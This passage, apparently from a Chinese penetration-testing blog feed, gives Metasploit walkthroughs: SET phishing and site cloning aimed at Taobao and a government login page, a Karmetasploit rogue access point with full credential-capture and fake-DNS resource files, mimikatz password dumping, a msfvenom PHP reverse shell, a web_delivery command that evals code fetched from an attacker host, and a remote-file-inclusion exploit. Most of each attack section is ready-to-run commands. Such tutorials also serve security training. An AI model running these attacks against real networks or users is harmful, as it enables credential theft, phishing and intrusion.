title="社会工程学"></a><strong>社会工程学</strong></h4><ul><li><p><strong>社会</strong></p><ul><li>人是社会化的动物(人与人之间的关系,群体利益决定结构架构)</li></ul></li><li><p><strong>工程</strong></p><ul><li>依据标准的步骤完成任务达成目标的一套方法</li><li>通过与人的交流,使用欺骗伪装等手段绕过安全机制实现入侵的非技术手段</li></ul></li></ul><p><strong>社会工程学攻击的四个阶段</strong></p><ol><li><strong>研究</strong>:<ul><li>信息收集(Web,媒体,垃圾桶,物理接触),确定并研究目标人</li></ul></li><li><strong>钩子</strong>:<ul><li>与目标建立第一次交谈(Hook,下套)</li></ul></li><li><strong>下手</strong>:<ul><li>与目标建立信任并获取信息</li></ul></li><li><strong>退场</strong>:<ul><li>不引起目标怀疑的离开攻击现场</li></ul></li></ol><ul><li><p><strong>类型</strong></p><ul><li><p>基于人的社工</p><ul><li>搭载</li><li>伪造身份</li><li>偷听/窃肩</li><li>反社工</li><li>垃圾桶工程</li></ul></li><li><p>基于计算机的社工</p><ul><li>弹出窗口</li><li>内部网络攻击</li><li>钓鱼邮件</li><li>419尼日利亚骗局</li><li>短信诈骗</li></ul></li></ul></li></ul><h4 id="Social-Engineering-Toolkit-SET"><a href="#Social-Engineering-Toolkit-SET" class="headerlink" title="Social-Engineering Toolkit (SET)"></a><strong>Social-Engineering Toolkit</strong> (SET)</h4><ul><li><p>SET工具菜单</p><ol><li>鱼叉式网络钓鱼攻击向量</li><li>网站攻击向量</li><li>传染性媒体生成器    </li><li>创建有效载荷和侦听器</li><li>群发邮件攻击</li><li>基于Arduino的攻击向量</li><li>无线接入点攻击向量</li><li>QRCode生成器攻击向量</li><li>Powershell攻击向量<ol start="10"><li>第三方模块</li></ol></li></ol></li><li><p>站点克隆: 1 2 3 2</p><ul><li><code>https://login.taobao.com/member/login.jhtml</code></li><li><code>http://admin.smeshx.gov.cn/login.php</code></li></ul></li><li><p>制作BadUSB: 1 3 1 2</p></li><li><p>发送钓鱼邮件: 1 1 2</p></li><li><p>WEB站站攻击向量: 1 2 1 2</p></li><li><p>中间文件全部存在 ~/.set目录中</p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;为什么在这说社会工程学-Social-Engineering&quot;&gt;&lt;a href=&quot;#为什么在这说社会工程学-Social-Engineering&quot; class=&quot;headerlink&quot; title=&quot;为什么在这说社会工程学 (Social Engineering)
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="漏洞利用" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
      <category term="MSF" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/MSF/"/>
    
    
      <category term="MSF" scheme="http://c.cat.plus/tags/MSF/"/>
    
      <category term="社会工程学" scheme="http://c.cat.plus/tags/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6/"/>
    
      <category term="Setoolkit" scheme="http://c.cat.plus/tags/Setoolkit/"/>
    
      <category term="BadUSB" scheme="http://c.cat.plus/tags/BadUSB/"/>
    
      <category term="钓鱼邮件" scheme="http://c.cat.plus/tags/%E9%92%93%E9%B1%BC%E9%82%AE%E4%BB%B6/"/>
    
      <category term="Arduino" scheme="http://c.cat.plus/tags/Arduino/"/>
    
  </entry>
  
  <entry>
    <title>MsF图形化端Armitage简介及使用方法</title>
    <link href="http://c.cat.plus/2016/03/19/Exploits/MsF/MsF%E5%9B%BE%E5%BD%A2%E5%8C%96%E7%AB%AFArmitage%E7%AE%80%E4%BB%8B%E5%8F%8A%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/"/>
    <id>http://c.cat.plus/2016/03/19/Exploits/MsF/MsF%E5%9B%BE%E5%BD%A2%E5%8C%96%E7%AB%AFArmitage%E7%AE%80%E4%BB%8B%E5%8F%8A%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/</id>
    <published>2016-03-18T18:27:11.000Z</published>
    <updated>2020-07-09T04:51:21.368Z</updated>
    
    <content type="html"><![CDATA[<h4 id="Armitage图形化前端"><a href="#Armitage图形化前端" class="headerlink" title="Armitage图形化前端"></a><strong>Armitage图形化前端</strong></h4><ul><li><p>开源免费图形前端</p><ul><li>作者自称是众多不会使用matasploit的安全专家之一(命令行)</li><li>MSF基于命令行,缺少直观的GUI图形用户接口</li></ul></li><li><p>Armitage只是调用MSF的漏洞利用能力</p><ul><li>Armitage的每一个GUI操作都可以对应MSF中的一条命令</li></ul></li><li><p>红队团队合作模拟对抗</p><ul><li>分为客户端(armitage)和服务器(msfrpcd)两部分</li><li><code>/usr/share/armitage/teamserver ip password</code></li></ul></li><li><p>可脚本化</p></li></ul><p><strong>启动方式</strong></p><pre><code>service postgresql startTeamserver    服务器: teamserver 服务器IP 连接密码    客户端: armitage</code></pre><ul><li>单机启动<ul><li>Armitage</li><li>GUI 启动</li><li><code>127.0.0.1:55553</code></li></ul></li></ul><h4 id="Armitage发现主机"><a href="#Armitage发现主机" class="headerlink" title="Armitage发现主机"></a><strong>Armitage发现主机</strong></h4><ul><li><p>手动添加IP地址</p></li><li><p>扫描结果导入(nmap,nessus,openvas,appscan,nexpose,awvs)</p><ul><li>使用nmap扫描网段所有主机导出到host.xml文件<ul><li><code>nmap 192.168.190.0/24 --open -oX host.xml</code></li></ul></li></ul></li><li><p>直接扫描发现(nmap,msf扫描模块)</p></li><li><p>DNS枚举发现</p></li><li><p>扫描端口及服务</p></li></ul><p><strong>工作区 workspace</strong></p><ul><li>个人视角的目标动态显示筛选,同一team的队员算定义工作区</li><li>基于IP地址的工作区划分</li><li>基于端口的工作区划分</li><li>基于操作系统的工作区划分</li><li>基于标签的工作区划分</li></ul><h4 id="生成payload"><a href="#生成payload" class="headerlink" title="生成payload"></a><strong>生成payload</strong></h4><ul><li><p>主动获取目标</p><ul><li>Armitage<ul><li><code>bind_hidden_tcp</code></li><li><code>bind_tcp</code></li><li><code>reverse_tcp</code></li><li><code>Ms08_067</code></li></ul></li></ul></li><li><p>被动获取目标</p><ul><li>Browser_autopwn2</li></ul></li></ul><p><strong>Meterpreter shell 能力展示</strong></p><ul><li>菜单功能</li><li>Cortana 脚本  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Veil-Evasion: </span><br><span class="line">locate veil-evasion#查找脚本所在路径位置</span><br><span class="line">&#x2F;use&#x2F;share&#x2F;veil-evasion&#x2F;tools&#x2F;cortana&#x2F;veil_evasion.cna</span><br><span class="line"></span><br><span class="line">#更多脚本</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;rsmudge&#x2F;cortana-scripts</span><br></pre></td></tr></table></figure></li><li>别无他法的最后选择<ul><li>Attacks<ul><li>Find Attacks        #自动分析匹配漏洞利用模块</li><li>Hail Mary            #上帝啊!赐予我力量吧!</li><li>洪水式漏洞利用代码执行,流量及特征明显,容易被发现</li></ul></li></ul></li></ul><h4 id="Armitage-现状"><a href="#Armitage-现状" class="headerlink" title="Armitage 现状"></a><strong>Armitage 现状</strong></h4><ul><li>维护不及时,传言此项目已荒废</li><li>仍然是目前唯一开源免费的metasploit图形前端</li><li>Metasploit 曾被发现两个远程代码执行漏洞<ul><li>问题都出在WEB组件方面</li><li>MSF不受影响</li></ul></li><li>安全面前软软平等<ul><li>没有无漏洞的软件</li></ul></li></ul><p><strong>Cobalt Strike</strong></p><ul><li>Cobalt Strike 也是一款以Metasploit为基础的GUI框架式渗透测试工具,集成了端口转发,服务扫描,自动化溢出,多模式端口监听,exe,powershell木马生成等.</li><li>商业红队模拟实战工具</li><li>有破解版</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;Armitage图形化前端&quot;&gt;&lt;a href=&quot;#Armitage图形化前端&quot; class=&quot;headerlink&quot; title=&quot;Armitage图形化前端&quot;&gt;&lt;/a&gt;&lt;strong&gt;Armitage图形化前端&lt;/strong&gt;&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="漏洞利用" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
      <category term="MSF" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/MSF/"/>
    
    
      <category term="MSF" scheme="http://c.cat.plus/tags/MSF/"/>
    
      <category term="nmap" scheme="http://c.cat.plus/tags/nmap/"/>
    
      <category term="armitage" scheme="http://c.cat.plus/tags/armitage/"/>
    
      <category term="teamserver" scheme="http://c.cat.plus/tags/teamserver/"/>
    
      <category term="Cobalt Strike" scheme="http://c.cat.plus/tags/Cobalt-Strike/"/>
    
  </entry>
  
  <entry>
    <title>MsF无线攻击资源组件之Karmetasploit</title>
    <link href="http://c.cat.plus/2016/03/18/Exploits/MsF/MsF%E6%97%A0%E7%BA%BF%E6%94%BB%E5%87%BB%E8%B5%84%E6%BA%90%E7%BB%84%E4%BB%B6%E4%B9%8BKarmetasploit/"/>
    <id>http://c.cat.plus/2016/03/18/Exploits/MsF/MsF%E6%97%A0%E7%BA%BF%E6%94%BB%E5%87%BB%E8%B5%84%E6%BA%90%E7%BB%84%E4%BB%B6%E4%B9%8BKarmetasploit/</id>
    <published>2016-03-17T18:27:11.000Z</published>
    <updated>2020-07-08T06:10:01.622Z</updated>
    
    <content type="html"><![CDATA[<h4 id="Karmetasploit-无线攻击资源组件"><a href="#Karmetasploit-无线攻击资源组件" class="headerlink" title="Karmetasploit     无线攻击资源组件"></a><strong>Karmetasploit</strong>     无线攻击资源组件</h4><ul><li>伪造AP,嗅探密码,截获数据,浏览器攻击</li><li>官方下载的只适用于演示或概念验证,实际攻击场景无效</li><li>下载资源文件<ul><li><code>wget https://www.offensive-security.com/wp-content/uploads/2015/04/karma.rc_.txt</code></li><li>资源文件可根据自己的需求自定义  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">db_connect postgres:toor@127.0.0.1&#x2F;msfbook</span><br><span class="line"></span><br><span class="line">use auxiliary&#x2F;server&#x2F;browser_autopwn</span><br><span class="line"></span><br><span class="line">setg AUTOPWN_HOST 10.0.0.1</span><br><span class="line">setg AUTOPWN_PORT 55550</span><br><span class="line">setg AUTOPWN_URI &#x2F;ads</span><br><span class="line"></span><br><span class="line">set LHOST 10.0.0.1</span><br><span class="line">set LPORT 45000</span><br><span class="line">set SRVPORT 55550</span><br><span class="line">set URIPATH &#x2F;ads</span><br><span class="line"></span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">use auxiliary&#x2F;server&#x2F;capture&#x2F;pop3</span><br><span class="line">set SRVPORT 110</span><br><span class="line">set SSL false</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">use auxiliary&#x2F;server&#x2F;capture&#x2F;pop3</span><br><span class="line">set SRVPORT 995</span><br><span class="line">set SSL true</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">use auxiliary&#x2F;server&#x2F;capture&#x2F;ftp</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">use auxiliary&#x2F;server&#x2F;capture&#x2F;imap</span><br><span class="line">set SSL false</span><br><span class="line">set SRVPORT 143</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">use auxiliary&#x2F;server&#x2F;capture&#x2F;imap</span><br><span class="line">set SSL true</span><br><span class="line">set SRVPORT 993</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">use auxiliary&#x2F;server&#x2F;capture&#x2F;smtp</span><br><span class="line">set SSL false</span><br><span class="line">set SRVPORT 25</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">use auxiliary&#x2F;server&#x2F;capture&#x2F;smtp</span><br><span class="line">set SSL true</span><br><span class="line">set SRVPORT 465</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">use auxiliary&#x2F;server&#x2F;fakedns</span><br><span class="line">unset TARGETHOST</span><br><span class="line">set SRVPORT 5353</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">use auxiliary&#x2F;server&#x2F;fakedns</span><br><span class="line">unset TARGETHOST</span><br><span class="line">set SRVPORT 53</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">use auxiliary&#x2F;server&#x2F;capture&#x2F;http</span><br><span class="line">set SRVPORT 80</span><br><span class="line">set SSL false</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">use auxiliary&#x2F;server&#x2F;capture&#x2F;http</span><br><span class="line">set SRVPORT 8080</span><br><span class="line">set SSL false</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">use auxiliary&#x2F;server&#x2F;capture&#x2F;http</span><br><span class="line">set SRVPORT 443</span><br><span class="line">set SSL true</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">use auxiliary&#x2F;server&#x2F;capture&#x2F;http</span><br><span class="line">set SRVPORT 8443</span><br><span class="line">set SSL true</span><br><span class="line">run</span><br></pre></td></tr></table></figure></li></ul></li></ul><p><strong>安装其它依赖包</strong></p><pre><code>gem install activerecord sqlite3-ruby</code></pre><p><strong>基础架构安装配置</strong></p><pre><code>apt-get install isc-dhcp-server#dhcp配置修改cat /etc/dhcp/dhcpd.confoption domain-name-servers 10.0.0.1;default-lease-time 60;max-lease-time 72;ddns-update-style none;authoritative;log-facility local7;subnet 10.0.0.0 netmask 255.255.255.0 {range 10.0.0.100 10.0.0.254;option routers 10.0.0.1; option domain-name-servers 10.0.0.1;}</code></pre><h4 id="伪造AP"><a href="#伪造AP" class="headerlink" title="伪造AP"></a><strong>伪造AP</strong></h4><pre><code>airmon-ng start wlan0airbase-ng -P -C 30 -e &quot;FREE&quot; -v wlan0monifconfig at0 up 10.0.0.1 netmask 255.255.255.0touch /var/lib/dhcp/dhcpd.leases                #创建dhcp租约文件dhcpd -cf /etc/dhcp/dhcpd.conf at0</code></pre><p><strong>启动 Karmetasploit</strong></p><pre><code>msfconsole -q -r karma.rc_.txt</code></pre><ul><li>资源文件默认不允许用户上网,对实际场景几乎没有任何价值<ul><li>允许用户上网需要修改配置</li><li>删除setg参数</li><li>增加 browser_autopwn2等其它模块</li><li><code>use auxiliary/server/fakedns</code> DNS欺骗模块配置修改</li><li>检测恶意流量的模块: <code>auxiliary/vsploit/malware/dns*</code> <ul><li><code>vi karma.rc_.txt</code> 修改后如下:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary&#x2F;server&#x2F;browser_autopwn</span><br><span class="line"></span><br><span class="line">set LHOST 10.0.0.1</span><br><span class="line">set SRVPORT 55550</span><br><span class="line">set URIPATH &#x2F;ads</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">use auxiliary&#x2F;server&#x2F;browser_autopwn2</span><br><span class="line">set SRVPORT 55560</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">use auxiliary&#x2F;server&#x2F;capture&#x2F;pop3</span><br><span class="line">set SRVPORT 110</span><br><span class="line">set SSL false</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">use auxiliary&#x2F;server&#x2F;capture&#x2F;pop3</span><br><span class="line">set SRVPORT 995</span><br><span class="line">set SSL true</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">use auxiliary&#x2F;server&#x2F;capture&#x2F;ftp</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">use auxiliary&#x2F;server&#x2F;capture&#x2F;imap</span><br><span class="line">set SSL false</span><br><span class="line">set SRVPORT 143</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">use auxiliary&#x2F;server&#x2F;capture&#x2F;imap</span><br><span class="line">set SSL true</span><br><span class="line">set SRVPORT 993</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">use auxiliary&#x2F;server&#x2F;capture&#x2F;smtp</span><br><span class="line">set SSL false</span><br><span class="line">set SRVPORT 25</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">use auxiliary&#x2F;server&#x2F;capture&#x2F;smtp</span><br><span class="line">set SSL true</span><br><span class="line">set SRVPORT 465</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">use auxiliary&#x2F;server&#x2F;fakedns</span><br><span class="line">set TARGETACTION FAKE</span><br><span class="line">set TARGETDOMAIN www.taobao.com</span><br><span class="line">set TARGETHOST192.168.190.176</span><br><span class="line">set SRVPORT 53</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">use auxiliary&#x2F;server&#x2F;capture&#x2F;http</span><br><span class="line">set SRVPORT 80</span><br><span class="line">set SSL false</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">use auxiliary&#x2F;server&#x2F;capture&#x2F;http</span><br><span class="line">set SRVPORT 8080</span><br><span class="line">set SSL false</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">use auxiliary&#x2F;server&#x2F;capture&#x2F;http</span><br><span class="line">set SRVPORT 443</span><br><span class="line">set SSL true</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">use auxiliary&#x2F;server&#x2F;capture&#x2F;http</span><br><span class="line">set SRVPORT 8443</span><br><span class="line">set SSL true</span><br><span class="line">run</span><br></pre></td></tr></table></figure></li></ul></li></ul></li></ul><p><strong>再次启动Karmetasploit</strong></p><pre><code>msfconsole -q -r karma.rc_.txt </code></pre><p><strong>添加路由和防火墙规则</strong></p><pre><code>echo 1 &gt; /proc/sys/net/ipv4/ip_forwardiptables -P FORWARD ACCEPTiptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE</code></pre><ul><li>到此,使用Karmetasploit且让伪造AP能使用户上网的配置完成</li><li>当别人连接到伪造AP,就可以截获流量,并自动执行资源文件中的攻击动作,如果存在漏洞将自动获取shell</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;Karmetasploit-无线攻击资源组件&quot;&gt;&lt;a href=&quot;#Karmetasploit-无线攻击资源组件&quot; class=&quot;headerlink&quot; title=&quot;Karmetasploit     无线攻击资源组件&quot;&gt;&lt;/a&gt;&lt;strong&gt;Karmetas
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="漏洞利用" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
      <category term="MSF" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/MSF/"/>
    
    
      <category term="MSF" scheme="http://c.cat.plus/tags/MSF/"/>
    
      <category term="伪造AP" scheme="http://c.cat.plus/tags/%E4%BC%AA%E9%80%A0AP/"/>
    
      <category term="meterpreter" scheme="http://c.cat.plus/tags/meterpreter/"/>
    
      <category term="airbase-ng" scheme="http://c.cat.plus/tags/airbase-ng/"/>
    
      <category term="无线攻击" scheme="http://c.cat.plus/tags/%E6%97%A0%E7%BA%BF%E6%94%BB%E5%87%BB/"/>
    
      <category term="Karmetasploit" scheme="http://c.cat.plus/tags/Karmetasploit/"/>
    
      <category term="dhcp" scheme="http://c.cat.plus/tags/dhcp/"/>
    
  </entry>
  
  <entry>
    <title>MsF后渗透测试阶段各种延伸用法</title>
    <link href="http://c.cat.plus/2016/03/17/Exploits/MsF/MsF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%98%B6%E6%AE%B5%E5%90%84%E7%A7%8D%E5%BB%B6%E4%BC%B8%E7%94%A8%E6%B3%95/"/>
    <id>http://c.cat.plus/2016/03/17/Exploits/MsF/MsF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%98%B6%E6%AE%B5%E5%90%84%E7%A7%8D%E5%BB%B6%E4%BC%B8%E7%94%A8%E6%B3%95/</id>
    <published>2016-03-16T22:37:10.000Z</published>
    <updated>2020-07-08T02:57:09.002Z</updated>
    
    <content type="html"><![CDATA[<h4 id="MsF延伸用法之Mimikatz"><a href="#MsF延伸用法之Mimikatz" class="headerlink" title="MsF延伸用法之Mimikatz"></a><strong>MsF延伸用法之Mimikatz</strong></h4><p><strong>hashdump 使用的就是mimikatz的部分功能</strong></p><pre><code>#meterpreterhashdumpgetsystem        #使用mimikatz需要先获取system权限load mimikatz    #加载mimikatzwdigest            #查看内存存储的明文密码信息kerberos        #查看内存存储的明文密码信息msv                #获取系统用户密码hash身份认证信息ssp                #获取明文的身份认证信息livessp            #获取明文的身份认证信息tspkg            #也是查看身份认证信息的命令#重点命令mimikatz_command -hmimikatz_command -f a::                    #加一个错误的模块名,可以当帮助使用mimikatz_command -f samdump::hashes            #获取samdump数据库的信息mimikatz_command -f handle::list            #查看系统进程mimikatz_command -f service::list            #查看系统服务mimikatz_command -f crypto::listProviders    #加密套件mimikatz_command -f winmine::infos            #扫雷作弊工具,纯属好玩的模块</code></pre><h4 id="PHP-shell"><a href="#PHP-shell" class="headerlink" title="PHP shell"></a><strong>PHP shell</strong></h4><pre><code>msfvenom -p php/meterpreter/reverse_tcp LHOST=1.1.1.1 LPORT=3333 -f raw -o a.php</code></pre><ul><li>MSF 启动侦听<ul><li>上传到web站点并通过浏览器访问,执行反弹shell</li></ul></li></ul><h4 id="Web-Delivery"><a href="#Web-Delivery" class="headerlink" title="Web Delivery"></a><strong>Web Delivery</strong></h4><ul><li>利用远程代码执行漏洞访问攻击者服务器  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;script&#x2F;web_delivery</span><br><span class="line">set target 1</span><br><span class="line">set URIPATH &#x2F;</span><br><span class="line">set lhost 192.168.190.178</span><br><span class="line">;php -d allow_url_fopen&#x3D;true -r “eval(file_get_contents(‘http:&#x2F;&#x2F;1.1.1.1&#x2F;fTYWqmu&#39;));&quot;</span><br></pre></td></tr></table></figure></li></ul><h4 id="RFI-远程文件包含"><a href="#RFI-远程文件包含" class="headerlink" title="RFI 远程文件包含"></a><strong>RFI 远程文件包含</strong></h4><pre><code>vi /etc/php5/cgi/php.ini        #php info 配置文件    allow_url_fopen = On    allow_url_include = On</code></pre><ul><li>使用php_include远程文件包含漏洞MSF模块  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;unix&#x2F;webapp&#x2F;php_include</span><br><span class="line">set RHOST 1.1.1.2</span><br><span class="line">set PATH &#x2F;dvwa&#x2F;vulnerabilities&#x2F;fi&#x2F;</span><br><span class="line">set PHPURI &#x2F;?page&#x3D;XXpathXX</span><br><span class="line">set HEADERS &quot;Cookie:security&#x3D;low;PHPSESSID&#x3D;eefcf023ba61219d4745ad7487fe81d7&quot;</span><br><span class="line">set payload php&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set lhost 1.1.1.1</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;MsF延伸用法之Mimikatz&quot;&gt;&lt;a href=&quot;#MsF延伸用法之Mimikatz&quot; class=&quot;headerlink&quot; title=&quot;MsF延伸用法之Mimikatz&quot;&gt;&lt;/a&gt;&lt;strong&gt;MsF延伸用法之Mimikatz&lt;/strong&gt;&lt;/h4&gt;
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="漏洞利用" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
      <category term="MSF" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/MSF/"/>
    
    
      <category term="MSF" scheme="http://c.cat.plus/tags/MSF/"/>
    
      <category term="mimikatz" scheme="http://c.cat.plus/tags/mimikatz/"/>
    
      <category term="meterpreter" scheme="http://c.cat.plus/tags/meterpreter/"/>
    
      <category term="后门持久化" scheme="http://c.cat.plus/tags/%E5%90%8E%E9%97%A8%E6%8C%81%E4%B9%85%E5%8C%96/"/>
    
      <category term="hashdump" scheme="http://c.cat.plus/tags/hashdump/"/>
    
      <category term="远程文件包含" scheme="http://c.cat.plus/tags/%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
      <category term="远程代码执行" scheme="http://c.cat.plus/tags/%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
    
  </entry>
  
  <entry>
    <title>MsF后渗透测试阶段之后门持久化</title>
    <link href="http://c.cat.plus/2016/03/16/Exploits/MsF/MsF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%98%B6%E6%AE%B5%E4%B9%8B%E5%90%8E%E9%97%A8%E6%8C%81%E4%B9%85%E5%8C%96/"/>
    <id>http://c.cat.plus/2016/03/16/Exploits/MsF/MsF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%98%B6%E6%AE%B5%E4%B9%8B%E5%90%8E%E9%97%A8%E6%8C%81%E4%B9%85%E5%8C%96/</id>
    <published>2016-03-16T11:37:28.000Z</published>
    <updated>2020-07-08T06:37:52.897Z</updated>
    
